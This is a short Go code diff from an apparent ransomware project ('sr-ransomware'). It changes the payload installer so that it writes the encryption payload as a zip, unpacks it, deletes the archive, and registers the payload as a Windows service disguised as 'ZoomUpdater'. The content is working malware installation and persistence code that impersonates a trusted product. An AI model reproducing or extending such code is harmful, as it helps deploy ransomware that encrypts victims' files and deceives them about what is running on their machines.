@@ -14,6 +14,7 @@ import (
     "bufio"
     "time"
 
+    "github.com/sug0/sr-ransomware/go/fs"
     "github.com/sug0/sr-ransomware/go/win"
     "github.com/sug0/sr-ransomware/go/exe"
     "github.com/sug0/sr-ransomware/go/errors"
@@ -22,9 +23,17 @@ import (
 )
 
 func InstallPayload(cryptoPayloadBytes []byte) error {
-    err := ioutil.WriteFile(cryptoPayload, cryptoPayloadBytes, 0744)
+    err := ioutil.WriteFile(cryptoZip, cryptoPayloadBytes, 0644)
     if err != nil {
-        return errors.Wrap(pkg, "failed to install payload", err)
+        return errors.Wrap(pkg, "failed to write payload", err)
+    }
+    err = fs.Unzip(cryptoDir, cryptoZip)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to unzip payload", err)
+    }
+    err = os.Remove(cryptoZip)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to remove zip payload", err)
     }
     err = win.InstallService("zoomupdater", "ZoomUpdater", cryptoPayload)
     if err != nil {
